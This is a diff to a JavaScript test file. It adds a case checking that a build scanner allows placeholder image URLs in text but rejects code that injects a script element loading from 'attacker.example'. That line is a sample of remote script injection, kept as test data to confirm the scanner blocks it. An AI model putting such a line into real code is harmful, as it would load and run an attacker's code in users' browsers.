@@ -123,6 +123,17 @@ test('allows fixed legal source navigation that does not load a runtime resource
   )).not.toThrow()
 })
 
+test('allows converter output text while still rejecting a DOM runtime source assignment', () => {
+  expect(() => assertNoExternalRuntimeOrigins(
+    'utility.js',
+    'const output = `<img src="https://placehold.co/400x300">`; const css = `url(https://placehold.co/400x300)`;',
+  )).not.toThrow()
+  expect(() => assertNoExternalRuntimeOrigins(
+    'app.js',
+    'const script = document.createElement("script"); script.src = "https://attacker.example/app.js";',
+  )).toThrow(/external runtime origin/i)
+})
+
 test('scans SVG, manifest JSON, MJS and nested worker artifacts in the final build tree', async () => {
   const distDirectory = await createTemporaryDirectory()
   await mkdir(join(distDirectory, 'nested'), { recursive: true })
